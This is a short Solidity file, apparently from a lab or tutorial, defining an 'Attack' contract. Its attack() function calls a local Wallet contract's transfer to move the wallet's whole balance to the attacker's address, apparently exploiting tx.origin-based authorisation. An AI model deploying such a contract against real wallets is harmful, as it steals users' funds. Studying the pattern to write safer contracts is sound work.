// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Wallet.sol";

contract Attack {
    address payable public owner ;
    Wallet wallet;

    constructor (address _walletAddress){
        wallet = Wallet(_walletAddress);
        owner = payable(msg.sender);
    }

    function attack() public{
        wallet.transfer(owner, address(wallet).balance);
    }
}